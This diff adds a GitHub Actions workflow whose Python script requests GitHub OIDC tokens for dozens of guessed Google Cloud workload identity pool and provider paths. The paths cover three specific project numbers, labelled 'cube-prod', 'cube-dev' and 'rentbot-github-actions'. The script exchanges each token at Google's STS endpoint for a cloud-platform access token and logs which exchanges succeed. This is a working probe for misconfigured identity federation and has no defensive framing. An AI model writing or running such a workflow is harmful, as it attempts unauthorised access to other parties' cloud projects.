@@ -1,0 +1,65 @@
+
+name: c211-i84800-probe
+on:
+  push:
+    branches: [ c211-i84800-mint ]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: probe
+        run: |
+          python3 - <<'PY'
+          import json, os, subprocess, urllib.parse, urllib.request, urllib.error, time
+          CANDS = []
+          for proj, pool0 in [('366271888053','cube-prod'),('744911585239','cube-dev')]:
+              combos = [(pool0,'github-actions'),(pool0,'github'),(pool0,'github-oidc'),
+                        (pool0,'github-provider'),(pool0,'github-actions-oidc'),
+                        ('github-actions','github-actions'),('github-pool','github-provider'),
+                        ('github','github')]
+              for pool, prov in combos:
+                  path = 'projects/%s/locations/global/workloadIdentityPools/%s/providers/%s' % (proj,pool,prov)
+                  CANDS.append((proj, path))
+          CANDS.append(('240990485203','projects/240990485203/locations/global/workloadIdentityPools/rentbot-github-actions/providers/github'))
+          CANDS.append(('240990485203','projects/240990485203/locations/global/workloadIdentityPools/rentbot-github-actions/providers/github-actions'))
+          def jl(b):
+              try: return json.loads(b)
+              except Exception: return {}
+          def post(url,data,headers=None):
+              h={'Content-Type':'application/json','Accept':'application/json','User-Agent':'c211-i84800-probe'}
+              if headers: h.update(headers)
+              r=urllib.request.Request(url,data=json.dumps(data).encode(),method='POST',headers=h)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=60); return resp.status,resp.read().decode()
+              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
+              except Exception as e: return -1,repr(e)[:300]
+          def oidc_token(aud):
+              u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+              if not u or not t: return ''
+              u=u+'&audience='+urllib.parse.quote(aud,safe='')
+              out=subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u],capture_output=True,text=True).stdout
+              return jl(out).get('value','')
+          for proj, path in CANDS:
+              out=[]
+              for prefix in ['//iam.googleapis.com/','https://iam.googleapis.com/']:
+                  aud=prefix+path
+                  idt=oidc_token(aud)
+                  if not idt:
+                      out.append({'aud_form':prefix,'idt':False}); continue
+                  st,b=post('https://sts.googleapis.com/v1/token',{
+                      'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
+                      'audience':aud,'scope':'https://www.googleapis.com/auth/cloud-platform',
+                      'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
+                      'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':idt})
+                  j=jl(b)
+                  out.append({'aud_form':prefix,'http':st,'ok':bool(j.get('access_token')),
+                              'err':None if j.get('access_token') else (j.get('error_description') or b[:200])})
+                  if j.get('access_token'): break
+              print('RESULT '+json.dumps({'proj':proj,'path':path,'r':out}),flush=True)
+          print('RESULT '+json.dumps({'kind':'done','utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())}),flush=True)
+          PY
